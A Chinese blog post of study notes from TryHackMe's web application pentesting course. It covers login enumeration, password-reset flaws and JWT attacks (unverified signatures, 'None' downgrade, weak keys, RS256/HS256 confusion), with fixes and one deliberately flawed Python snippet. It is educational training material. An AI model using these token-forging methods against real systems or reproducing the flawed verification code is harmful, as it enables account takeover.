<!doctype html>
<html lang="zh"><head>
<title>Try Hack Me - Web Application Pentesting - Recopec 的博客</title>
<meta charset="UTF-8">
<meta name="keywords" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
<meta name="description" content="前言：感觉纯粹是为了记录而记录的，回过头来看，基本上忘记的差不多了，只有一个大概的印象，看来之后回去还是得要复习一下，不过也留了记录了，之后这个笔记会完善的。 可以看看之后的 WP，比如说 AD、Red Teaming 那些，大部分都是我通关一遍之后再来单独整理的，有自己的理解的文字。 枚举与暴力破解认证枚举的目的 鉴别有效用户名 密码规则  常见枚举地方 注册页 可以看到用户名或者密码被使用了没">
<meta property="og:type" content="article">
<meta property="og:title" content="Try Hack Me - Web Application Pentesting">
<meta property="og:url" content="https://blog.irec.moe/thm_wap.html">
<meta property="og:site_name" content="Recopec 的博客">
<meta property="og:description" content="前言：感觉纯粹是为了记录而记录的，回过头来看，基本上忘记的差不多了，只有一个大概的印象，看来之后回去还是得要复习一下，不过也留了记录了，之后这个笔记会完善的。 可以看看之后的 WP，比如说 AD、Red Teaming 那些，大部分都是我通关一遍之后再来单独整理的，有自己的理解的文字。 枚举与暴力破解认证枚举的目的 鉴别有效用户名 密码规则  常见枚举地方 注册页 可以看到用户名或者密码被使用了没">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.irec.moe/Web_Application_Pentesting%5C802fad8f6515cfe16750e11e4b89957a.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b62f90be37525447e4a9118b906f1291.svg">
<meta property="og:image" content="https://blog.irec.moe/Web_Application_Pentesting%5C25f541a57c89cb198f879c7fefee15ec.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f01b7f9b691452f47a11b6363d5711b.svg">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/60cc684893cd19e782fb0178285e93fd.svg">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/62d1c36e7c84315008fdfb09519c218f.svg">
<meta property="og:image" content="https://blog.irec.moe/Web_Application_Pentesting.assets/298d76a6f0bdc20abdd69a78516f1a46.png">
<meta property="og:image" content="https://blog.irec.moe/thm_wap/image-20250729152931821.png">
<meta property="article:published_time" content="2025-07-16T16:00:00.000Z">
<meta property="article:modified_time" content="2025-08-30T00:37:24.140Z">
<meta property="article:author" content="Recopec">
<meta property="article:tag" content="WEB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.irec.moe/Web_Application_Pentesting%5C802fad8f6515cfe16750e11e4b89957a.png">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1758794476197">

<link rel="stylesheet" href="/css/style.css?v=1758794476197">






<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1758794476197"></script>

 



<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Recopec 的博客" type="application/atom+xml">
</head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/bg.jpg)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Recopec"><img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Recopec">
            <img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec" alt="Recopec">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>25</div>
        <div><span>标签</span>34</div>
        <div><span>分类</span>6</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博主
            </div>
        </a>
        
    </div>
    
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://cn.bing.com/search?q=site:irec.moe" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>




    
        
        <div class="nexmoe-widget-wrap">
	<div class="nexmoe-widget nexmoe-social">
		<a
			class="mdui-ripple"
			href="https://space.bilibili.com/8209358"
			target="_blank"
			mdui-tooltip="{content: '哔哩哔哩'}"
			style="
				color: rgb(231, 106, 141);
				background-color: rgba(231, 106, 141, .1);
			"
		>
			<i
				class="nexmoefont icon-bilibili"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://github.com/Recopec/"
			target="_blank"
			mdui-tooltip="{content: 'GitHub'}"
			style="
				color: rgb(25, 23, 23);
				background-color: rgba(25, 23, 23, .1);
			"
		>
			<i
				class="nexmoefont icon-github"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://twitter.com/Recopec"
			target="_blank"
			mdui-tooltip="{content: 'Twitter'}"
			style="
				color: rgb(59, 151, 239);
				background-color: rgba(59, 151, 239, .1);
			"
		>
			<i
				class="nexmoefont icon-twitter"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://t.me/Recopec"
			target="_blank"
			mdui-tooltip="{content: 'TG'}"
			style="
				color: rgb(70, 151, 239);
				background-color: rgba(59, 151, 239, .1);
			"
		>
			<i
				class="nexmoefont icon-telegram"
			></i> </a
		>
	</div>
</div>

    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/THM/">THM</a>
          <span class="category-list-count">6</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/学习/">学习</a>
          <span class="category-list-count">3</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/无线电/">无线电</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/生活/">生活</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/硬件/">硬件</a>
          <span class="category-list-count">8</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/网络/">网络</a>
          <span class="category-list-count">4</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/Active-Directory/" style="font-size: 10px;">Active Directory</a> <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/C/" style="font-size: 10px;">C#</a> <a href="/tags/OpenClash/" style="font-size: 10px;">OpenClash</a> <a href="/tags/OpenVPN/" style="font-size: 10px;">OpenVPN</a> <a href="/tags/OpenWrt/" style="font-size: 10px;">OpenWrt</a> <a href="/tags/PC/" style="font-size: 10px;">PC</a> <a href="/tags/VR/" style="font-size: 10px;">VR</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/WireGuard/" style="font-size: 10px;">WireGuard</a> <a href="/tags/WireShark/" style="font-size: 10px;">WireShark</a> <a href="/tags/%E4%BF%9D%E5%81%A5/" style="font-size: 10px;">保健</a> <a href="/tags/%E5%85%89%E7%8C%AB/" style="font-size: 15px;">光猫</a> <a href="/tags/%E5%8D%87%E5%AD%A6/" style="font-size: 10px;">升学</a> <a href="/tags/%E5%8D%AB%E6%98%9F/" style="font-size: 10px;">卫星</a> <a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 10px;">抓包</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 15px;">数据库</a> <a href="/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/" style="font-size: 10px;">无线电</a> <a href="/tags/%E6%9C%BA%E5%9C%BA/" style="font-size: 10px;">机场</a> <a href="/tags/%E6%A0%88/" style="font-size: 10px;">栈</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E7%81%B5%E8%BD%A6/" style="font-size: 10px;">灵车</a> <a href="/tags/%E7%94%B5%E6%B1%A0/" style="font-size: 10px;">电池</a> <a href="/tags/%E7%9F%AD%E6%B3%A2/" style="font-size: 10px;">短波</a> <a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 10px;">硬盘</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 15px;">笔记</a> <a href="/tags/%E7%BB%8F%E9%AA%8C/" style="font-size: 10px;">经验</a> <a href="/tags/%E7%BB%AD%E5%91%BD/" style="font-size: 10px;">续命</a> <a href="/tags/%E7%BD%91%E5%8D%A1/" style="font-size: 10px;">网卡</a> <a href="/tags/%E7%BE%8A%E6%AF%9B/" style="font-size: 10px;">羊毛</a> <a href="/tags/%E7%BE%A4%E6%99%96/" style="font-size: 15px;">群晖</a> <a href="/tags/%E8%80%83%E8%AF%95/" style="font-size: 10px;">考试</a> <a href="/tags/%E9%93%B6%E8%A1%8C%E5%8D%A1/" style="font-size: 10px;">银行卡</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(34);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        <!-- 一言 -->
<div class="nexmoe-widget-wrap">
  <h3 class="nexmoe-widget-title">
    一言
  </h3>
  <div class="nexmoe-widget">
    <ul class="hitokoto-box">
      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
        <a href="#" id="hitokoto_text">
          
        </a>
        <a href="#" id="hitokoto_error_text" style="display: none;">
          
        </a>
      </li>
    </ul>
  </div>
</div>

<script>
  let hitokotoText = document.getElementById('hitokoto_text')
  let hitokotoErroText = document.getElementById('hitokoto_error_text')
  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
  window.addEventListener('load', function () {
    let url = 'https://v1.hitokoto.cn'
    if (hitokotoCategory) {
      url += '?c=' + hitokotoCategory
    }
    fetch(url)
      .then(response => response.json())
      .then(data => {
        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
      })
      .catch((reason) => {
        console.error(11, reason)
        hitokotoText.style.display = 'none'
        hitokotoErroText.style.display = 'block'
      })
  })
</script>
    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">3</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">最新文章</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/thm_openvpn_conf.html">TryHackMe OpenVPN 配置优化指北</a>
          </li>
        
          <li>
            <a href="/android_capture.html">Android 抓包配置 (Charles + Burp)</a>
          </li>
        
          <li>
            <a href="/thm_rthe.html">Try Hack Me - Red Teaming</a>
          </li>
        
          <li>
            <a href="/thm_ad.html">Try Hack Me - Active Directory</a>
          </li>
        
          <li>
            <a href="/thm_wap.html">Try Hack Me - Web Application Pentesting</a>
          </li>
        
      </ul>
    </div>
  </div>

    
        
   
    <div class="nexmoe-copyright">
        &copy; 2025 Recopec
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
            <img src="/thm_wap/cover.jpg" alt="Try Hack Me - Web Application Pentesting" loading="lazy">
            <h1>Try Hack Me - Web Application Pentesting</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2025年07月17日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/THM/">THM</a>
        
        
    <a><i class="nexmoefont icon-areachart"></i>约18.5k字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要74分钟</a>

    </div>
    
    
    
    
    
</div>

    <p>前言：感觉纯粹是为了记录而记录的，回过头来看，基本上忘记的差不多了，只有一个大概的印象，看来之后回去还是得要复习一下，不过也留了记录了，之后这个笔记会完善的。</p>
<p>可以看看之后的 WP，比如说 AD、Red Teaming 那些，大部分都是我通关一遍之后再来单独整理的，有自己的理解的文字。</p>
<h1 id="枚举与暴力破解"><a href="#枚举与暴力破解" class="headerlink" title="枚举与暴力破解"></a>枚举与暴力破解</h1><h2 id="认证枚举的目的"><a href="#认证枚举的目的" class="headerlink" title="认证枚举的目的"></a>认证枚举的目的</h2><ul>
<li>鉴别有效用户名</li>
<li>密码规则</li>
</ul>
<h3 id="常见枚举地方"><a href="#常见枚举地方" class="headerlink" title="常见枚举地方"></a>常见枚举地方</h3><ul>
<li>注册页<ul>
<li>可以看到用户名或者密码被使用了没有</li>
</ul>
</li>
<li>密码重置功能<ul>
<li>通过后端的反应来判断用户名是否存在</li>
</ul>
</li>
<li>错误信息</li>
<li>数据泄露<ul>
<li>比如说一个人的信息肯定会有复用的地方</li>
</ul>
</li>
</ul>
<h2 id="通过详细错误枚举用户邮箱"><a href="#通过详细错误枚举用户邮箱" class="headerlink" title="通过详细错误枚举用户邮箱"></a>通过详细错误枚举用户邮箱</h2><p><strong>可以从系统详细错误里面容易泄露的有：</strong></p>
<ul>
<li>内部路径</li>
<li>数据库详情</li>
<li>用户信息</li>
</ul>
<p><strong>诱发详细错误的方法</strong>：</p>
<ul>
<li>无效的登录<ul>
<li>试着输一点错误的用户名和密码试试</li>
</ul>
</li>
<li>SQL 注入</li>
<li>文件包含、路径穿越</li>
<li>篡改表单</li>
<li>Fuzz</li>
</ul>
<p>通过登录功能，如果提示邮箱不存在，则可以通过遍历邮箱来找到存在的邮箱地址。</p>
<h2 id="通过密码重置的逻辑来破解"><a href="#通过密码重置的逻辑来破解" class="headerlink" title="通过密码重置的逻辑来破解"></a>通过密码重置的逻辑来破解</h2><p>一般密码重置有以下几种方法</p>
<ul>
<li>基于邮箱的重置</li>
<li>基于安全问题的重置</li>
<li>基于短信的重置</li>
</ul>
<p>而每个方法都有他的弱点</p>
<ul>
<li>可预测的 Token<ul>
<li>token 有规律，或者 token 可以被爆破，也就是有效性没有做限制</li>
</ul>
</li>
<li>Token 有效期</li>
<li>校验强度不够<ul>
<li>比如说问题太常见了</li>
</ul>
</li>
<li>信息泄露<ul>
<li>会泄露用户名或者邮箱，以提供更多线索</li>
</ul>
</li>
<li>不安全的传输<ul>
<li>没用 HTTPS，可能会被劫持</li>
</ul>
</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>后面的就是一个爆破密码重置 token，和一个爆破 HTTP Basic 认证的。然后说了一下信息收集的手段，网页时光机和搜索引擎的语法。</p>
<h1 id="Session-管理"><a href="#Session-管理" class="headerlink" title="Session 管理"></a>Session 管理</h1><p>这一章就说了一下 Cookie 和 Session 的区别，然后演示了一下客户端这边改 session 字段达到垂直越权。</p>
<h1 id="JWT-安全"><a href="#JWT-安全" class="headerlink" title="JWT 安全"></a>JWT 安全</h1><h2 id="JSON-Web-Tokens"><a href="#JSON-Web-Tokens" class="headerlink" title="JSON Web Tokens"></a>JSON Web Tokens</h2><h3 id="JWT-结构"><a href="#JWT-结构" class="headerlink" title="JWT 结构"></a>JWT 结构</h3><p>JWT 由三部分组成，每部分都是由 Base64Url 编码的，用 <code>.</code> 隔开。</p>
<ul>
<li>头部<ul>
<li>通常表示了这是什么类型的 token 和用了哪种加密算法</li>
</ul>
</li>
<li>载荷<ul>
<li>是 token 的主体，里面包含 claims。 claims 是为特定实现提供的一条信息。在 JWT 中有注册声明，以及公共和私有声明。</li>
</ul>
</li>
<li>签名<ul>
<li>签名是验证 token 有效性的一种方法，签名所用的算法在头部中有写明</li>
</ul>
</li>
</ul>
<h3 id="签名算法"><a href="#签名算法" class="headerlink" title="签名算法"></a>签名算法</h3><ul>
<li>None<ul>
<li>字面意思，没有算法，实际上是一个没有签名的 JWT</li>
</ul>
</li>
<li>对称签名<ul>
<li>HS256，他会使用一个<strong>共享的密钥 (secret key)</strong> 来计算 JWT 的头部和载荷的哈希值。</li>
<li>签名包含的内容：<strong>Base64Url 编码后的头部 + 一个点 (<code>.</code>) + Base64Url 编码后的载荷</strong></li>
</ul>
</li>
<li>不对称签名<ul>
<li>RS256，先生成 hash，然后用私钥加密这个 hash。</li>
</ul>
</li>
</ul>
<h2 id="敏感字段泄露"><a href="#敏感字段泄露" class="headerlink" title="敏感字段泄露"></a>敏感字段泄露</h2><ol>
<li><strong>敏感信息被直接包含在 JWT 的 <code>payload</code> 中</strong>。比如 <code>password</code> 和 <code>flag</code> 这样的敏感数据，不应该被直接放到 JWT 中，因为 JWT 会被发送到客户端。由于 JWT 的 <code>payload</code> 只是经过 Base64 编码，未加密，任何拿到 JWT 的人都可以轻易解码并查看其中的内容。</li>
<li><strong>后端不应盲目信任 <code>payload</code> 中的敏感数据</strong>。服务器端在收到 JWT 并验证其签名后，不应该直接使用 <code>payload</code> 中可能包含的敏感信息（如 <code>password</code> 或 <code>flag</code>）。这些敏感信息<strong>不应由客户端提供</strong>。</li>
<li><strong>正确的做法是从后端数据库中查找敏感数据</strong>。当服务器需要这些敏感信息时，它应该从 JWT 中提取非敏感的用户标识符（比如 <code>username</code>），然后使用这个标识符去自己的后端数据库中安全地查询并获取真正的敏感数据（比如用户的权限、角色、<code>flag</code> 值等）。</li>
</ol>
<h2 id="签名验证错误"><a href="#签名验证错误" class="headerlink" title="签名验证错误"></a>签名验证错误</h2><h3 id="不验证签名"><a href="#不验证签名" class="headerlink" title="不验证签名"></a>不验证签名</h3><h4 id="利用签名未验证漏洞进行攻击"><a href="#利用签名未验证漏洞进行攻击" class="headerlink" title="利用签名未验证漏洞进行攻击"></a>利用签名未验证漏洞进行攻击</h4><p>正如你所说，攻击者利用这个缺陷的方式就是：</p>
<ol>
<li><strong>篡改 <code>payload</code> 内容：</strong> 攻击者可以修改 JWT <code>payload</code> 中的任何信息，例如将 <code>admin</code> 字段从 <code>0</code> 改为 <code>1</code>。</li>
<li><strong>删除或忽略签名：</strong> 因为服务器根本不验证签名，所以攻击者甚至可以删除 JWT 的签名部分（第三部分），或者直接随便填一个错误的签名，服务器仍然会接受。</li>
<li><strong>冒充高权限用户：</strong> 攻击者可以伪造一个 <code>admin: 1</code> 的 JWT，然后冒充管理员用户进行请求，从而达到获取敏感信息（如 <code>flag</code>）的目的。</li>
</ol>
<h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>修复这个漏洞的方法非常直接和关键：<strong>始终验证 JWT 签名。</strong></p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.secret, </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;HS256&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>

<ul>
<li>通过提供 <code>secret</code>（对于对称签名算法如 HS256）或 <code>public key</code>（对于非对称签名算法如 RS256），JWT 解码库会强制进行签名验证。</li>
<li>只有当 JWT 的签名是使用正确的密钥生成的，且 JWT 的头部和载荷内容与签名匹配时，<code>jwt.decode</code> 才会成功，否则会抛出验证错误。</li>
</ul>
<h3 id="签名可被降级"><a href="#签名可被降级" class="headerlink" title="签名可被降级"></a>签名可被降级</h3><p><strong>核心漏洞：签名可被降级到 <code>None</code></strong></p>
<p>简单来说，这个漏洞允许攻击者：</p>
<ol>
<li><strong>修改 JWT 头部 (<code>header</code>) 中的 <code>alg</code> (algorithm) 字段为 <code>None</code>。</strong></li>
<li>将修改后的 JWT 发送给服务器。</li>
<li>如果服务器端的 JWT 验证库没有正确处理 <code>None</code> 算法（特别是当它<strong>没有显式地拒绝 <code>None</code> 算法</strong>或者<strong>没有指定一个允许的算法列表</strong>时），它可能会错误地<strong>跳过签名验证</strong>，并认为这个“未签名”的 JWT 是有效的。</li>
</ol>
<p><strong>开发者的错误：</strong> 问题在于开发者没有正确地实现验证逻辑：</p>
<ul>
<li><p><strong>没有锁定算法：</strong> 开发者可能没有强制要求只能使用特定的签名算法（例如 <code>HS256</code>）。</p>
</li>
<li><p><strong>没有拒绝 <code>None</code> 算法：</strong> 他们的代码可能没有明确地拒绝 <code>None</code> 算法，导致库在遇到 <code>None</code> 时，默认跳过签名验证。</p>
</li>
<li><p><strong>动态读取 <code>alg</code>：</strong> 文中提到的“开发者的错误”示例就是：</p>
<figure class="shiki Python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre><code>header = jwt.get_unverified_header(token) # 获取未验证的头部
signature_algorithm = header['alg']       # 读取攻击者控制的 alg 字段
payload = jwt.decode(token, self.secret, algorithms=signature_algorithm) # 用这个 alg 去解码</code></pre></div></div></figure>

<p>这种方式让攻击者通过控制 <code>alg</code> 字段，来控制服务器用来验证签名的算法。当攻击者将 <code>alg</code> 改为 <code>None</code> 时，<code>jwt.decode</code> 函数会接收到 <code>algorithms=None</code>，从而导致签名验证被绕过。</p>
</li>
</ul>
<h4 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a><strong>修复方案</strong></h4><p>修复方法很简单：<strong>在调用 JWT 解码函数时，显式地提供一个</strong>允许的签名算法<strong>列表</strong>。</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.secret, </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&quot;HS256&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;HS384&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;HS512&quot;</span><span style="color: #ABB2BF">])</span></span></code></pre></div></div></figure>

<ul>
<li>通过这种方式，即使攻击者将 JWT 头部中的 <code>alg</code> 字段改为 <code>None</code>，或者任何不在 <code>[&quot;HS256&quot;, &quot;HS384&quot;, &quot;HS512&quot;]</code> 列表中的算法，<code>jwt.decode</code> 函数也会抛出错误，拒绝该 JWT，因为它只接受明确指定的安全算法。</li>
<li>文中的 <code>Pyjwt</code> 库也对此进行了安全增强，当指定了 <code>secret</code> 但 <code>alg</code> 为 <code>None</code> 时会抛出异常，这是防止此类攻击的一种内置保护。</li>
</ul>
<hr>
<p>总而言之，这个例子完美展示了 <strong>“最小权限原则”</strong> 在代码层面的体现：<strong>只允许明确的安全算法</strong>，而不是盲目信任 JWT 头部中声明的算法。这是防止 JWT 伪造的关键防御措施之一。</p>
<h3 id="弱对称密钥"><a href="#弱对称密钥" class="headerlink" title="弱对称密钥"></a>弱对称密钥</h3><p>因为对称密钥的使用，所以 JWT 的安全性就依赖密钥的熵和长度了。因为对称密钥是可以恢复的，所以密钥一旦泄露，就导致数据的安全性得不到保障了。</p>
<h3 id="JWT-算法混淆攻击"><a href="#JWT-算法混淆攻击" class="headerlink" title="JWT 算法混淆攻击"></a>JWT 算法混淆攻击</h3><p>核心漏洞点：后端 JWT 验证库的实现错误，将非对称算法的<strong>公钥</strong>错误地用作对称算法（HS256）的<strong>密钥</strong>。</p>
<h4 id="攻击流程分解"><a href="#攻击流程分解" class="headerlink" title="攻击流程分解"></a><strong>攻击流程分解</strong></h4><ol>
<li><strong>原始服务器设置：</strong><ul>
<li>服务器最初使用 <strong>RS256（非对称）</strong> 算法来签名 JWT。这意味着服务器有一个私钥（用于签名）和一个公钥（用于验证）。<strong>这个公钥是公开的。</strong></li>
<li>服务器的验证逻辑可能允许多种算法，包括 RS256 和 HS256，并且错误地处理了密钥类型。</li>
</ul>
</li>
<li><strong>攻击者的操作：</strong><ul>
<li><strong>步骤 1：获取原始 JWT 和公钥。</strong><ul>
<li>攻击者通过认证获得一个合法的 JWT。</li>
<li><strong>攻击者也获得了服务器的公钥。</strong> （通常通过 API 或证书是公开可获取的）。</li>
</ul>
</li>
<li><strong>步骤 2：篡改 JWT 的头部。</strong><ul>
<li>攻击者将 JWT 头部中的 <code>alg</code> 字段从 <code>RS256</code> 修改为 <strong><code>HS256</code></strong>。</li>
<li>攻击者同时可以修改 <code>payload</code> 中的任何内容（比如将 <code>admin:0</code> 改为 <code>admin:1</code>）。</li>
</ul>
</li>
<li><strong>步骤 3：使用</strong>服务器的公钥<strong>作为 HS256 的“秘密密钥”来签名伪造的 JWT。</strong><ul>
<li>这是最关键的一步。由于攻击者知道了服务器的<strong>公钥</strong>，他们就使用这个公钥作为 HS256 的<strong>秘密密钥</strong>来对篡改后的 JWT 头部和载荷进行签名。</li>
<li>记住：HS256 签名算法的特点是，<strong>签名和验证都使用同一个密钥</strong>。</li>
</ul>
</li>
</ul>
</li>
<li><strong>服务器端的错误验证逻辑（漏洞所在）：</strong><ul>
<li>当服务器接收到这个被篡改的 JWT 时，它会读取 <code>alg</code> 字段，发现它是 <code>HS256</code>。</li>
<li>此时，<strong>有缺陷的 JWT 验证库</strong>会发生混淆：它本应该使用一个真正的 HS256 秘密密钥来验证签名。但是，由于它的实现缺陷，<strong>它错误地将原本用于验证 RS256 的公钥（这个公钥在服务器端是已知的）当作了 HS256 的“秘密密钥”</strong>。</li>
<li>服务器现在用这个“（伪装成）HS256 密钥的公钥”来验证 JWT 的签名。</li>
</ul>
</li>
<li><strong>攻击成功：</strong><ul>
<li>攻击者在步骤 3 中，就是用这个<strong>公钥</strong>作为“秘密密钥”来生成 HS256 签名的。</li>
<li>服务器现在用<strong>同一个公钥</strong>作为“秘密密钥”来验证签名。</li>
<li><strong>因为用于签名和验证的“密钥”是同一个（都是服务器的公钥），所以签名验证成功！</strong></li>
</ul>
</li>
</ol>
<p><strong>总结</strong></p>
